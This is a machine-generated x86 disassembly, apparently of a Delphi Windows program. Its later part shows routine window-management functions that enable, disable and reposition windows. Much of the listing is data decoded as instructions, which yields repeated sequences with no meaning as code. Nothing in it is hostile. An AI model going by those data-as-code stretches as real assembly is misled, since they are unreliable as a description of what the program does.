mov [ ebx ] al
fcom st3
inc esp
add [ eax ] bl
test [ ebx ] eax
in al dx
rol [ eax + eax - 0x38 ] cl
mov [ ebx ] al
int3
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
cld
rol [ eax + eax + 0x1 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ esi + ebx * 4 ] dl
inc esp
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
shl [ esi + ebx * 4 + 0x44 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x449f ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x61 ] bh
inc esp
add [ esi + 0x1c00449f ] bl
add al [ eax ]
add [ esp + ecx + 0x43 ] bl
add al ah
cdq
inc ecx
sub_449ca4
inc esp
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
push [ edi + ecx * 8 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
call [ eax - 0x30 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
xchg esp eax
rol [ eax + eax + 0x1 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
sahf
inc esp
add [ eax ] cl
ja r-xdata
outsd
insb
outsd
jb r-xdata
add [ ebx + esi - 0x70f7ffc0 ] al
inc ebx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
inc ebx
add [ esi + edi * 4 - 0x421fffbd ] dl
inc ebx
add al bh
inc ebx
add [ eax ] bh
mov ah 0x43
add [ eax - 0x4c ] bl
inc ebx
add [ eax - 0x4f ] dh
mov esi 0x86d00043
inc ebx
add [ esi + edi + 0x41 ] dh
dec esi
outsd
jb r-xdata
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
add eax 0x676e6152
add [ gs : eax ] dl
adc [ eax ] al
or al 0x0
add bh bh
mov edi cs
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
add [ esi + edi * 4 + 0x43 ] ah
add al dl
xchg [ ebx ] al
je r-xdata
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
[ eax + edx * 8 + 0x10044 ]
add [ eax ] al
je r-xdata
jo r-xdata
add [ esp + ebp * 2 + 0x43 ] ah
add [ eax + eax * 2 + 0x73840043 ] al
inc ebx
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
inc ecx
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0xd3280041 0x44
js r-xdata
test [ eax + 0x43 ] al
add [ ebx + esi * 2 + 0x499c0043 ] al
inc ebx
add al bh
cdq
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
call [ eax + edx * 8 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
add [ eax + 0x640044d3 ] ah
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ ebp + ecx * 4 + 0x6ee40043 ] ah
inc ebx
add ah al
mov cl 0x43
add [ eax + 0x7c0043b2 ] al
lodsd [ esi ]
inc ebx
add [ edx + esi * 4 + 0x43 ] ah
add [ eax - 0x26 ] bl
inc esp
add [ esp + edx * 8 ] ch
inc esp
add [ eax ] dh
mov [ ebx ] al
fcom st3
inc esp
add [ eax ] bl
test [ ebx ] eax
in al dx
rol [ eax + eax - 0x38 ] cl
mov [ ebx ] al
int3
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
cld
rol [ eax + eax + 0x1 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ esi + ebx * 4 ] dl
inc esp
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
shl [ esi + ebx * 4 + 0x44 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x449f ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x61 ] bh
inc esp
add [ esi + 0x1c00449f ] bl
add al [ eax ]
add [ esp + ecx + 0x43 ] bl
add al ah
cdq
inc ecx
sub_449d2c
fcom st0
inc esp
add al dh
rol [ eax + eax ] 0x1
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
push ebx
insd
outsd
outsd
je r-xdata
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
call [ eax - 0x30 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
xchg esp eax
rol [ eax + eax + 0x1 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
[ eax + edx * 8 + 0x10044 ]
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
sahf
inc esp
add [ eax ] cl
ja r-xdata
add [ ebx + esi - 0x70f7ffc0 ] al
inc ebx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
inc ebx
add [ esi + edi * 4 - 0x421fffbd ] dl
inc ebx
add al bh
inc ebx
add [ eax ] bh
mov ah 0x43
add [ eax - 0x4c ] bl
inc ebx
add [ eax - 0x4f ] dh
mov esi 0x86d00043
inc ebx
add [ esi + edi + 0x41 ] dh
dec esi
outsd
jb r-xdata
add [ esi + edi * 4 + 0x43 ] ah
add al dl
xchg [ ebx ] al
je r-xdata
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
jo r-xdata
add [ esp + ebp * 2 + 0x43 ] ah
add [ eax + eax * 2 + 0x73840043 ] al
inc ebx
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
inc ecx
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0xd3280041 0x44
js r-xdata
test [ eax + 0x43 ] al
add [ ebx + esi * 2 + 0x499c0043 ] al
inc ebx
add al bh
cdq
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add [ eax + 0x640044d3 ] ah
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ ebp + ecx * 4 + 0x6ee40043 ] ah
inc ebx
add ah al
mov cl 0x43
add [ eax + 0x7c0043b2 ] al
lodsd [ esi ]
inc ebx
add [ edx + esi * 4 + 0x43 ] ah
add [ eax - 0x26 ] bl
inc esp
add [ esp + edx * 8 ] ch
inc esp
add [ eax ] dh
mov [ ebx ] al
fcom st3
inc esp
add [ eax ] bl
test [ ebx ] eax
in al dx
rol [ eax + eax - 0x38 ] cl
mov [ ebx ] al
int3
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
cld
rol [ eax + eax + 0x1 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ esi + ebx * 4 ] dl
inc esp
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
shl [ esi + ebx * 4 + 0x44 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x449f ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x61 ] bh
inc esp
add [ esi + 0x1c00449f ] bl
add al [ eax ]
add [ esp + ecx + 0x43 ] bl
add al ah
cdq
inc ecx
sub_44a0c4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x44 ] ah
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
inc esp
add dh ch
mov eax [ 0x2240044 ]
add [ eax ] al
pop eax
sahf
inc esp
add al ah
cdq
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
add al ah
mov eax [ 0xffffffffa1ee0044 ]
inc esp
add [ edx + eax ] ah
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
add [ ebx + esi - 0x70f7ffc0 ] al
inc ebx
add al al
xor [ eax ] al
inc ebx
add [ esi + edi * 4 - 0x421fffbd ] dl
inc ebx
add al bh
inc ebx
add [ eax ] bh
mov ah 0x43
add [ eax - 0x4c ] bl
inc ebx
add [ eax - 0x4f ] dh
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
mov al [ 0xc030044 ]
push esp
inc edx
outsd
jb r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] dh
mov al [ 0x46050044 ]
outsd
inc edx
outsd
jb r-xdata
add [ eax + 0x640044d3 ] ah
jb r-xdata
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0xdb580041 0x44
js r-xdata
cdq
jae r-xdata
jb r-xdata
mov esi 0x86d00043
inc ebx
add [ esi + edi + 0x41 ] dh
add [ esp + ebp * 2 + 0x43 ] ah
add [ eax + eax * 2 + 0x73840043 ] al
inc ebx
xor eax [ eax ]
or [ edi + 0x30c00043 ] cl
inc eax
add ah bl
xor [ eax ] al
mov al [ 0x640044d3 ]
je r-xdata
add eax 0x30000000
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
inc eax
add [ ecx ] cl
jb r-xdata
je r-xdata
jae r-xdata
push ebx
outsd
outsb
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
fdiv [ eax ]
inc eax
jae r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
or al 0xa1
mov al [ 0x62060044 ]
jae r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0x30000000 ] al
inc ebx
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ ebp + ecx * 4 + 0x6ee40043 ] ah
inc ebx
add ah al
mov cl 0x43
add [ eax + 0x7c0043b2 ] al
lodsd [ esi ]
inc ebx
add [ edx + esi * 4 + 0x43 ] ah
add [ eax - 0x26 ] bl
inc esp
add [ esp + edx * 8 ] ch
inc esp
add [ eax ] dh
mov [ ebx ] al
mov eax 0x180044db
test [ ebx ] eax
in al dx
rol [ eax + eax - 0x38 ] cl
mov [ ebx ] al
int3
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
jae r-xdata
add [ eax ] al
mov [ 0x44 ] al
outsd
outsd
insb
push edi
sub_44adc4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi - 0x4f5bffbc ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
scasd [ edi ]
inc esp
add [ edx - 0x7ffbb50 ] dl
add al [ eax ]
add [ eax - 0x62 ] bl
inc esp
add al ah
cdq
inc ecx
add ah bl
fld [ eax + eax - 0x70 ]
fild [ eax + eax - 0x7c ]
xor eax [ eax ]
cld
add eax [ ebp ]
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
clc
fild [ eax + eax + 0x64 ]
mov esi 0xe5680043
inc esp
add [ esi + edi + 0x41 ] dh
add [ eax - 0xbffbb1f ] bh
loope r-xdata
add [ eax + 0x6e ] ah
inc ebx
add [ eax ] al
jecxz r-xdata
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x15 ] al
inc esp
add [ edx + ebp * 8 ] cl
inc esp
add [ eax + 0x4c ] cl
inc ebx
add [ eax - 0x1bffbb15 ] bh
outsb
inc ebx
add ah al
mov cl 0x43
add [ eax + 0x7c0043b2 ] al
lodsd [ esi ]
inc ebx
add [ edx + esi * 4 + 0x43 ] ah
add [ eax - 0x26 ] bl
inc esp
add [ edx + esi * 8 + 0x44 ] bl
add [ eax ] dh
mov [ ebx ] al
and bh bh
inc esp
add [ eax + 0x3c004502 ] al
add [ ebp ] eax
enter 0x4388 0x0
int3
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
inc ecx
add [ eax - 0x15 ] bh
inc esp
add al bl
xchg esi eax
inc ecx
add [ eax ] bl
daa
inc ebp
add [ eax - 0x24 ] dl
inc esp
add [ eax - 0x47 ] bh
inc ebx
add [ esi + edi * 4 - 0x421fffbd ] dl
inc ebx
add al bh
inc ebx
add [ eax ] bh
mov ah 0x43
add [ eax - 0x18 ] bl
inc esp
add [ eax - 0x4f ] dh
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ ecx + ebp * 8 + 0x44 ] cl
sub_44b0c8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ edx + 0x44 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xb2
inc esp
add al bh
add al [ eax ]
add al al
lodsd [ esi ]
inc esp
add al ah
cdq
inc ecx
add ah bl
fld [ eax + eax - 0x70 ]
fild [ eax + eax - 0x7c ]
xor eax [ eax ]
cld
add eax [ ebp ]
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
clc
fild [ eax + eax + 0x64 ]
mov esi 0xe5680043
inc esp
add [ esi + edi + 0x41 ] dh
add [ eax - 0xbffbb1f ] bh
loope r-xdata
add [ eax + 0x6e ] ah
inc ebx
add [ eax ] al
jecxz r-xdata
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x15 ] al
inc esp
add [ edx + ebp * 8 ] cl
inc esp
add [ eax + 0x4c ] cl
inc ebx
add [ eax - 0x1bffbb15 ] bh
outsb
inc ebx
add ah al
mov cl 0x43
add [ eax + 0x7c0043b2 ] al
lodsd [ esi ]
inc ebx
add [ edx + esi * 4 + 0x43 ] ah
add [ eax - 0x26 ] bl
inc esp
add [ edx + esi * 8 + 0x44 ] bl
add [ eax ] dh
mov [ ebx ] al
and bh bh
inc esp
add [ eax + 0x3c004502 ] al
add [ ebp ] eax
enter 0x4388 0x0
int3
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
inc ecx
add [ eax - 0x15 ] bh
inc esp
add al bl
xchg esi eax
inc ecx
add [ eax ] bl
daa
inc ebp
add [ eax - 0x24 ] dl
inc esp
add [ eax - 0x47 ] bh
inc ebx
add [ esi + edi * 4 - 0x421fffbd ] dl
inc ebx
add al bh
inc ebx
add [ eax ] bh
mov ah 0x43
add [ eax - 0x18 ] bl
inc esp
add [ eax - 0x4f ] dh
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ ecx + ebp * 8 + 0x44 ] cl
sub_44be75
mov edi 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
mov edi 0xbfdc0044
inc esp
add al bh
add al [ eax ]
add al al
lodsd [ esi ]
inc esp
add al ah
cdq
inc ecx
add ah bl
fld [ eax + eax - 0x70 ]
fild [ eax + eax - 0x7c ]
xor eax [ eax ]
cld
add eax [ ebp ]
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
clc
add [ eax + 0x6e ] ah
inc ebx
add [ eax ] al
jecxz r-xdata
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x15 ] al
inc esp
add [ edx + ebp * 8 ] cl
inc esp
add [ eax + 0x4c ] cl
inc ebx
add [ eax - 0x1bffbb15 ] bh
outsb
inc ebx
add ah al
mov cl 0x43
add [ eax + 0x7c0043b2 ] al
lodsd [ esi ]
inc ebx
add [ edx + esi * 4 + 0x43 ] ah
add [ eax - 0x26 ] bl
inc esp
add [ edx + esi * 8 + 0x44 ] bl
add [ eax ] dh
mov [ ebx ] al
and bh bh
inc esp
add [ eax + 0x3c004502 ] al
add [ ebp ] eax
enter 0x4388 0x0
int3
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
inc ecx
add [ eax - 0x15 ] bh
inc esp
add al bl
xchg esi eax
inc ecx
add [ eax ] bl
daa
inc ebp
add al dh
sub [ ebp ] al
js r-xdata
fild [ eax + eax + 0x64 ]
mov esi 0xe5680043
inc esp
add [ esi + edi + 0x41 ] dh
add [ edx + ebp + 0x45 ] bl
add ah dh
loope r-xdata
add [ ebx + esi + 0x3fc0040 ] al
inc ebp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add al bh
inc ebx
add [ esi + edi * 4 - 0x421fffbd ] dl
inc ebx
add al bh
inc ebx
add [ eax ] bh
mov ah 0x43
add [ eax - 0x18 ] bl
inc esp
add [ eax - 0x4f ] dh
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ ecx + ebp * 8 + 0x44 ] cl
sub_44c040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al al
inc esp
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0x70004010 ]
rol [ eax + eax + 0x30 ] 0xc1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add al bh
cdq
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0x2ddc0041 0x45
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
xor cl al
inc esp
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
loopne r-xdata
inc esp
add [ eax + 0x2004122 ] al
add [ 0x6d726f46 ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
rol [ eax + eax - 0x60 ] 0x0
add [ eax ] al
test [ ecx ] ah
inc ecx
add al ah
cdq
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or [ ebp + ecx * 2 + 0x6f ] dl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0xe000408d
rol [ eax + eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc cl al
inc esp
add [ eax ] dh
rol [ eax + eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al cl
inc esp
add [ eax - 0x7c000000 ] ah
and [ ecx ] eax
loopne r-xdata
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
xor eax [ eax ]
jl r-xdata
add [ eax + 0xc0044c0 ] cl
add [ eax ] al
add [ eax + 0x70004010 ] ah
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
add [ ebx + esi + 0x33780040 ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ edi + ebp ] dh
inc ebp
add [ eax + 0x3f ] bl
inc ecx
add al ch
xchg ebp eax
inc ecx
add [ esi + edi + 0x41 ] dh
add al al
xchg esi eax
inc ecx
add [ ebp + edx * 4 - 0x692fffbf ] cl
inc ecx
add al cl
xchg edi eax
inc ecx
xchg ebx eax
inc ecx
add [ ebx + esi + 0x33780040 ] al
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax + eax * 2 + 0x3f580045 ] ch
inc ecx
add al ch
xchg ebp eax
inc ecx
add [ esi + edi + 0x41 ] dh
add al al
xchg esi eax
inc ecx
add [ ebp + edx * 4 - 0x692fffbf ] cl
inc ecx
add al cl
xchg edi eax
inc ecx
add al bh
cdq
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0x3ec00041 0x45
push cs
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp al 0x0
add [ eax ] al
movsb [ edi ] [ esi ]
aas
inc edx
add [ eax + eax ] cl
add [ eax + edx + 0x500040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] al
add [ eax + edx + 0x8c0040 ] dl
add [ eax ] al
or al 0x54
inc ecx
jo r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
nop
mov eax 0x44c1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
rol [ eax + eax + 0x34 ] 0xc2
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ah
retn 0x44
sti
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
xor al 0xc2
inc esp
add [ edi ] al
or al 0x54
inc ecx
jo r-xdata
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
mov eax 0x800044c1
and al [ ecx ]
add al [ eax ]
add eax 0x6d726f46
jae r-xdata
add [ ecx + rw-data ] ah
retn
sub_44c264
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_44c2b0
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_455aa8
mov eax [ rw-data ]
call sub_419510
mov eax [ rw-data ]
call sub_4194b8
retn
push 0x0
push eax
call ShowOwnedPopups
sub_44c2e8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_44c338
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_44c3db
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_44c3a4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_44c2e8
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c3e2
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_44c3ec
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4026dc
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_44c424
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_44c488
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_44c424
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_44c4e4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_44c504
